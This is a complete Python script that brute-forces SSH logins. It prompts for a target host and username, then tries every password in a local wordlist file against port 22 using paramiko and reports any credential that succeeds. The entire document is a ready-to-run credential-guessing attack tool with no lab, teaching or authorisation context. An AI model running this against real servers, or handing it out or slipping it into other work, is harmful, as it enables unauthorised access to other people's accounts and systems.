import paramiko
import sys
import os
import socket
import termcolor

host = input('Enter target address: ')
username = input('Enter SSH username: ')
print('\n')
password_file  = 'passfile.txt'
#if __name__ == '__main__':
if not os.path.exists(password_file):
    print('File/PAth doesnt exist')
    sys.exit(1)


def ssh_connect(passwd,code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host,port=22,username=username,password=passwd)

    except paramiko.AuthenticationException:
        code = 1

    except socket.error as e:
        code =2
    ssh.close()
    return code


with open(password_file,'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Found password ' + password + ' for account ' + username), 'green'))
            elif response == 1:
                print('[-]Incorrect Login ')
            elif response ==2:
                print('[*]Cannot connect')
        except Exception as e:
            print(e)
            pass

